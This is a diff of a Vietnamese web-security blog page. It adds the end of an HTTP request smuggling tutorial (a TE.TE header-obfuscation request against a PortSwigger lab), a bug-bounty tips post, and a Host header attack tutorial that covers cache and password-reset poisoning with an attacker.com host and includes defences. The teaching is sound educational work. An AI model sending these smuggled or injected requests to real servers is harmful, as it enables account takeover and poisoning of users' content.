+
+<!-- wp:preformatted -->
+<pre class="wp-block-preformatted">GPOST / HTTP/1.1\r\n
+\r\n
+0\r\n
+\r\n</pre>
+<!-- /wp:preformatted -->
+
+<!-- wp:paragraph -->
+<p>Và reponse trả về với lỗi dễ hiểu</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":205,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-5.png" alt="" class="wp-image-205"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ok!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":3} -->
+<h3>TE.TE</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Đây kiểu cuối cùng, nó cũng tự như CL.CL là sử dụng 2 header TE trong reuqest nhưng mà nó vẫn chưa rõ quy chế như CL.CL (lỗi 400) trong tài liệu của RFC, nghe đâu đó là nó đang được thực hiện.Tuy nhiên , thực tế FE server và BE server không xử lí giống nhau nên nó sẽ khó hơn CL.CL. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Vì vậy chúng ta cần tìm cách đưa TE.TE về 2 kiểu TE vs CL. Trick được đưa ra trong Portswigger là che dấu header TE, có dùng trong request nhưng không được xử lí.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a rel="noreferrer noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank">Link Lab PortSwigger</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Trong trương hợp này cả 2 server đều muôn xử lí TE. Như các bạn đã biết TE sẽ có 5 giá trị mặc định (gzip, chunked, identity...), mình sẽ giấu một header bằng cách cho nó giá trị không tồn tại là "cow" và thêm cả CL vào request.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:preformatted -->
+<pre class="wp-block-preformatted">POST / HTTP/1.1\r\n
+Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
+Accept-Language: en-US,en;q=0.5\r\n
+Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
+Content-length: 4\r\n
+Transfer-Encoding: chunked\r\n
+Transfer-encoding: cow\r\n
+\r\n
+5c\r\n
+GPOST / HTTP/1.1\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 15\r\n
+\r\n
+x=1\r\n
+0\r\n
+\r\n</pre>
+<!-- /wp:preformatted -->
+
+<!-- wp:paragraph -->
+<p>FE sẽ xử lí TE đầu tiên, nó kiểm tra đến khi đọc đến "0\r\n\r\n" . Request hoàn chỉnh và forward đến BE. BE xét header TE cuối nhưng có vấn đề và nó chuyển sang xử lí bằng CL. Như vậy trong trường hợp FE cử lí TE đầu tiền còn BE xử lí TE cuối thì ta đã đưa về kiểu TE.CL, còn nếu như FE xử lí TE cuối  còn BE xứ lí TE đầu thì ngược lại.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":208,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-6.png" alt="" class="wp-image-208"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>OK như vậy là mình đã trình bày xong về các kiểu tấn công HRS, bạn không hiểu phần nào hãy để lại comment cho mình.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":3} -->
+<h3 id="6-how-to-prevent-http-request-smuggling">Cách ngăn chặn buôn lậu yêu cầu HTTP</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Chúng ta đã biết tác hại của lỗ hổng HTTP request Smuggling và chúng ta sẽ đặt câu hỏi: làm thế nào để ngăn chặn nó?&nbsp;Có ba cách phòng thủ chung (không dành riêng cho một máy chủ cụ thể nào cả nha).</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Vô hiệu hóa "reuse" sử dụng kết nối TCP - <a rel="noreferrer noopener" href="https://docs.apigee.com/api-platform/antipatterns/disable-persistent-connections" target="_blank">disable kết nối liên tục</a> (keep -alive) giữa proxy server và back-end server</li><li>Sử dụng giao thức HTTP/2. HTTP/2 có cách ngăn chặn HRS bằng các tính năng mới như "Request multiplexing over a single TCP connection, Compression of request headers"</li><li>Máy chủ front và back end  sử dụng cùng một máy chủ hoặc tất cả các máy chủ chạy cùng một phần mềm máy chủ web có cùng cấu hình ( Tránh các phiên bản cho phép lỗ hổng này diễn ra như <a rel="noreferrer noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-8004" target="_blank">Apache Traffic Server</a> (ATS) versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3 - <a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/" target="_blank" rel="noreferrer noopener">POC</a>).</li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p>Tất nhiên các biện pháp trên chỉ có thể giải quyết vấn đề một cách cơ bản và còn nhiều khiếm khuyết như vô hiệu hóa việc sử dụng lại kết nối TCP giữa máy chủ proxy và máy chủ back-end, điều này sẽ làm tăng áp lực lên  back-end server.&nbsp;Sử dụng HTTP/2 thì không thể được quảng bá trong các điều kiện mạng hiện tại, ngay cả khi máy chủ hỗ trợ giao thức HTTP / 2 tương thích với HTTP / 1.1.&nbsp;Và xét về bản chất, lý do dẫn đến HTTP request Smuggling  không phải là vấn đề thiết kế giao thức mà là vấn đề của việc triển khai máy chủ khác nhau.&nbsp;Cá nhân mình nghĩ rằng giải pháp tốt nhất là thực hiện nghiêm túc theo các tiêu chuẩn quy định trong RFC7230-7235, nhưng đây là điều khó khăn nhất để đạt được.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Cảm ơn các bạn đã đọc , mình rất thích lỗ hổng này nên chắc chắn sẽ có bài viết thêm về nó , mong các bạn đón đọc nha!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>Tài liệu tham khảo</h2>
+<!-- /wp:heading -->
+
+<!-- wp:list -->
+<ul><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></li><li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a href="https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/</a></li></ul>
+<!-- /wp:list -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/15/WEB%20Pentesting/Web%20Server/HTTP%20Request%20Smuggling%20Attack/" data-id="ckbgnw38b0008jnjmhz2929u3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-BugBounty/TIP/SCSP" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/BugBounty/TIP/SCSP/" class="article-date">
+  <time datetime="2020-06-15T02:37:19.017Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/BugBounty/TIP/SCSP/">BugBounty/TIP/SCSP</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:paragraph -->
+<p>Source: Seasoned Cyber Security Professionals</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":222,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EQA36MwUUAIKJgq.jpeg" alt="" class="wp-image-222"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":223,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EQpQxqxXUAA1XNQ.jpeg" alt="" class="wp-image-223"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":224,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ERENeHdU4AYTrhA.jpeg" alt="" class="wp-image-224"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":225,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ESGicEGXsAIAuyZ.jpeg" alt="" class="wp-image-225"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":226,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ETYh8eUXkAA1nmZ.jpeg" alt="" class="wp-image-226"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":227,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ETYh8gLWsAIqY2h.jpeg" alt="" class="wp-image-227"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":228,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EUYMBCTXkAA9PPS.jpeg" alt="" class="wp-image-228"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":229,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EUYMBCXXgAIfW4T.jpeg" alt="" class="wp-image-229"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://scontent.fhan2-4.fna.fbcdn.net/v/t1.0-9/90263180_197491121672407_104104672905658368_n.jpg?_nc_cat=106&amp;_nc_sid=8024bb&amp;_nc_oc=AQlY638JCBzJJyPGgQksAKkdGcZBz8RfxqfhdyXzV6FnwmhTGSbrTBzW4B_jNphLChc&amp;_nc_ht=scontent.fhan2-4.fna&amp;oh=cf6efba272513e2c1de0127e3fc1906c&amp;oe=5EB2BB17" alt="Không có mô tả ảnh."/></figure>
+<!-- /wp:image -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://scontent.fhan2-4.fna.fbcdn.net/v/t1.0-9/90920440_202762121145307_5055889622286991360_n.jpg?_nc_cat=106&amp;_nc_sid=8024bb&amp;_nc_oc=AQlyVEJqE9fZNSZMxluWIDoWhJM3IcGXHyU9plr1ZzDC9PyHRq2bWyMHnLfSFHXC_po&amp;_nc_ht=scontent.fhan2-4.fna&amp;oh=61af73213d7fedfa7423c07a9198539c&amp;oe=5EB0DD73" alt="Không có mô tả ảnh."/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Source <a href="https://www.youtube.com/user/RapidBug" target="_blank" rel="noreferrer noopener">InsiderPhD</a> channel on Youtube</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=oTeQSG5LjjE","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
+<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
+https://www.youtube.com/watch?v=oTeQSG5LjjE
+</div></figure>
+[![InsiderPhD]()](https://www.youtube.com/watch?v=oTeQSG5LjjE)
+
+<!-- /wp:core-embed/youtube -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/14/BugBounty/TIP/SCSP/" data-id="ckbfw0gc5000j77jm5ta2d9a4" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TECH/Host Header Attack" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/TECH/Host%20Header%20Attack/" class="article-date">
+  <time datetime="2020-06-15T02:32:13.501Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/TECH/Host%20Header%20Attack/">TECH/Host Header Attack</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:image {"align":"center","width":485,"height":266} -->
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQYlVnvXSiQcarEPtvEKnYSHVLvIvgVcvzuHwJmX4PDXY2QHco2&amp;usqp=CAU" alt="HOST HEADER INJECTION ATTACK - Ram Kumar - Medium" width="485" height="266"/></figure></div>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Xin chào các bạn! Mình lại quay trở lại với một lỗ hổng thuộc dạng HTTP header injection . Kiểu tấn công này thì nó không quá phức tạp vì mức ảnh hưởng của nó cũng chỉ ở mức bình thường. Nhưng như vậy không có nghĩ là mình sẽ bỏ qua, đôi khi có những cái mình không ngờ lại là cái nguy hiểm nhất. Vậy Host Header Attack có gì hay? Chúng ta cùng tìm hiểu nào?</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>A client MUST include a Host header field in all HTTP/1.1 request<br>messages</p><cite><strong>RFC 2616</strong></cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Theo như trong tài liệu <strong><a href="https://tools.ietf.org/html/rfc2616#page-128" target="_blank" rel="noopener">RFC 2616</a></strong> ở mục 14.23 thì trong tất cả các message HTTP/1.1 request từ Client đén Server bắt buộc phải bao gồm trường  "Host" header .&nbsp;Nếu URI được request đến không chứa tên máy chủ Internet của dịch vụ thì trường Host header coi như có giá trị là "empty"(rỗng) .&nbsp;Bất kỳ request HTTP/1.1 nào không có trường Host header  thì sẽ được máy chủ phản hồi với mã trạng thái là 400 (bad request). Thế "Host" header để làm gì ta?</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Thông thường một máy chủ web thường phục vụ, lưu trữ nhiều website hoặc ứng dụng web và tất nhiên chúng sẽ cùng một địa chỉ IP của server. Mỗi website hay ứng dụng được lưu trữ như vậy được gọi là "Virtual host".Bây giờ làm sao cho người dùng có thể truy cập vào các website khác nhau ? Đó là lí do của HOST header tồn tại. Tiêu đề này sẽ nằm trong HTTP request đến máy chủ và máy chủ sẽ sử dụng giá trị của header này để chuyển request đến website hoặc ứng dụng được chỉ định. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Điều gì xảy ra nếu chúng ta thay đổi giá trị của header là các host không xác định (evil.com) ? Hầu hết các máy chủ web thường chuyển các các host khồng xác định trong header vào đầu của danh sách "virtual host" của nó, Vì vậy các request tới server với host header không xác định như vậy vẫn được coi là hợp lệ.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":252,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-9.png" alt="" class="wp-image-252"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ngoài ra ngoài việc sử dụng "Host" header , attacker còn có thể sử dụng "X-Forward-Host" (viết tắt là XFH) để inject. XFH được sủ dụng để chỉ định máy chủ được chỉ định (X-Forward-Host: cdn.example.com) chuyển tiếp giá trị của "Host" header đến máy chủ gốc.XFH thường được áp dụng trong trương hợp sử dụng proxy hoặc các CDN, trong tài liệu của <a href="https://tools.ietf.org/html/rfc7230#section-5.4" target="_blank" rel="noreferrer noopener">RFC 7230</a>, phần 5.4 có nói:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>When a proxy receives a request with an absolute-form of<br>request-target, the proxy MUST ignore the received Host header field<br>(if any) and instead replace it with the host information of the<br>request-target.</p><cite>Ngoài ra bạn có thể tham khảo thêm về tài liệu của <a href="https://www.keycdn.com/support/x-forwarded-host" target="_blank" rel="noreferrer noopener">KeyCDN</a></cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:image {"id":253,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-10.png" alt="" class="wp-image-253"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Header này thường được sử dụng phổ biến trong các ứng dụng web PHP, .&nbsp;Một số kịch bản trong ví dụ sau đây là cách sử dụng tiêu biểu và nguy hiểm của host header:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>&lt;script src="http://&lt;?php echo _SERVER&#91;'HOST'] ?>/script.js">
+</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Kẻ tấn công có thể lợi dụng code ở trên để tạo đầu ra HTML chỉ bằng cách thao túng host header.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>GET / HTTP/1.1
+Host: www.attacker.com
+&#91; X-Forwarded-Host: www.attacker.com ]</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Và kết quả nhận được là trình duyệt của victims sẽ load file .js từ máy chủ của attacker :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>&lt;script src="http://attacker.com/script.js"></code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Từ đây attacker có thể thực hiện một cuộc tấn công xss hoặc phising. Nhưng với kiểu này sẽ rất khó để khai thác ở ngoài thực tế. bạn chỉ có thể thay đổi được giá trị các header trong request của victim chỉ khi bạn có thể can thiệp vào giữa giao tiếp của Client vs Server như kiểu MITM (Man in the middle). Các bug bounty program thường không công nhận lỗi này vì vậy bỏ qua hướng đó và tiếp tục leo thang.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Sẽ có 2 hướng tấn công chính từ lỗ hổng HHA mình muốn đề cập là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank">web cache poisoning</a> và Password reset poisoning.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Đối với Web cache poisoning</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Để điều này xảy ra, kẻ tấn công sẽ cần phải đầu độc proxy cache của trang web hoặc nhà cung cấp được website sử dụng như các CDN.&nbsp;Cache sau đó sẽ phục vụ nội dung bị nhiễm độc cho bất kỳ ai request với nội dung tương tự, và tất nhiên nạn nhân không thể kiểm soát được nội dung độc hại mà cache cung cấp cho họ. Để hiểu rõ hơn về WCP các bạn có thểm tham khảo <a href="http://hydrasky.ml/2020/03/web-cache-poisoning-part-1" target="_blank" rel="noreferrer noopener">bài viết</a> của mình.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"align":"center","width":458,"height":307} -->
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://blog.cloudflare.com/content/images/2018/08/subtle-req-resp.png" alt="How Cloudflare protects customers from cache poisoning" width="458" height="307"/><figcaption>Ví dụ</figcaption></figure></div>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Một điều lưu ý ở đây là lên sử dụng X-Forwarded-Host thay vì Host header để poisoning bởi vì thông thường Host header nằm trong cache key và bình thường sẽ chẳng ai tự thay đổi giá trị host header của mình về host của attacker hoặc thành một payload độc hại cả.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Đối với Password reset poisoning</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Thông thường khi bạn quên mật khẩu bạn sẽ chọn cách là reset lại nó và chức năng nay ai cũng có thể sử dụng. Server sẽ tiến hành gửi email với link reset mật khẩu có dạng&nbsp;<code>example.com/reset-password?email=victim@gmail.com&amp;code=identify:token</code>&nbsp;(<code>identify:token</code>&nbsp;thường được mã hóa) . Mình sẽ không giải thích code như thế nào nha! Các bạn cử hiêu đơn giản lúc này server sử dụng _SERVER['HOST'] để xác định host của link.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Attacker đã lợi dụng điều này dùng tên tài khoản như email, username ... của victim để thực hiện. Trước khi request được gửi đi, attacker sẽ sửa giá trị của host header thành máy chủ của attacker .Server sẽ tiến hành gửi email với link reset mật khẩu có dạng&nbsp;là <code>attacker.com/reset-password?email=victim@gmail.com</code>&amp;<code>code=identify:token</code>&nbsp;(<code>identify:token</code>&nbsp;thường được mã hóa).</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ok như vậy khi victim vào mail và click vào link reset mật khẩu sẽ request đến server của attacker. Attacker lúc này chỉ việc ngồi và xem log trên máy chủ sẽ lấy được link hay quan trọng hơn đó la token để đổi mật khẩu của victim.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":257,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-11.png" alt="" class="wp-image-257"/><figcaption><a href="https://hackerone.com/reports/281575" target="_blank" rel="noopener">https://hackerone.com/reports/281575</a></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Cách tìm kiếm lỗ hổng này</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Để phát hiện ra nó rât đơn giản bạn chỉ cần chặn bắt request bằng các công cụ như Burpsuite hoặc Zap và thay đổi giá trị của Host header hoặc thêm vào X-Forwarded-Host rồi theo dõi reponse trả về là biết. Hoặc các bạn có thể sử dụng các công cụ scan web tự động như Acunetix. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"align":"center","width":515,"height":253} -->
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.cloudace.in/wp-content/uploads/2020/01/acunetix.png" alt="Acunetix Web Vulnerability Scanning Software - CloudACE Technologies" width="515" height="253"/></figure></div>
+<!-- /wp:image -->
+
+<!-- wp:heading {"level":3} -->
+<h3>Các phòng chống lỗ hổng</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Thay vì sử dụng host header để xác định thì lập trình viên nên sử dụng SERVER_NAME.Bởi vì SERVER_NAME sẽ lấy thông tin từ cấu hình của máy chủ nên nó sẽ xác thực hơn. Cùng với đó bạn có thể kết hợp với việc sử dụng Whitelist cho các tên server được phép</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:preformatted -->
+<pre class="wp-block-preformatted">$domains = [‘abc.example.com’, ‘foo.bar.com’];<br>if ( ! in_array($_SERVER[‘SERVER_NAME’], $domains)) {<br>// error<br>}</pre>
+<!-- /wp:preformatted -->
+
+<!-- wp:paragraph -->
+<p>OK như vậy là mình đã nó xong về Host header attack, nói chung thì lỗ hổng này không có gì quá nổi bật nhưng cũng đáng để chúng ta học hỏi thêm kinh nghiệm. Xin chào và hẹn gặp các bạn vào bài viết sau!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading -->
+<h2>Tham khảo</h2>
+<!-- /wp:heading -->
+
+<!-- wp:list -->
+<ul><li><a href="https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/" target="_blank" rel="noopener">https://www.yeahhub.com/host-header-attack-practical-exploitation-and-prevention/</a></li><li><a href="https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html" target="_blank" rel="noopener">https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</a></li><li><a href="https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/</a></li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p></p>
+<!-- /wp:paragraph -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/14/TECH/Host%20Header%20Attack/" data-id="ckbfvtosm000i77jmbwux4yd6" class="article-share-link">Share</a>
+      
+      
     </footer>
   </div>
   
@@ -613,6 +2170,11 @@ CLIENT SECRET ở đây là một giá trị bí mật chỉ cho phép APP và A
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -657,11 +2219,23 @@ CLIENT SECRET ở đây là một giá trị bí mật chỉ cho phép APP và A
       <ul>
         
           <li>
-            <a href="/2020/06/14/csp/">csp</a>
+            <a href="/2020/06/15/CTF%20/RootMe/WEB-CLIENT/">CTF /RootMe/WEB-CLIENT</a>
           </li>
         
           <li>
-            <a href="/2020/06/14/oath/">Oauth</a>
+            <a href="/2020/06/15/WEB%20Pentesting/Web%20App/CROSS%20SIDE%20REQUEST%20FORGERY/">WEB Pentesting/Web App/CROSS SIDE REQUEST FORGERY</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/15/WEB%20Pentesting/Web%20App/Cross%20Site%20Scripting%20(Part1)/">WEB Pentesting/Web App/Cross Site Scripting (Part1)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/15/WEB%20Pentesting/Web%20Server/SUBDOMAIN%20TAKEOVER/">WEB Pentesting/Web Server/SUBDOMAIN TAKEOVER</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/15/WEB%20Pentesting/Web%20Server/Server%20Side%20Request%20Forgery%20(Part1)/">WEB Pentesting/Web Server/Server Side Request Forgery (Part1)</a>
           </li>
         
       </ul>
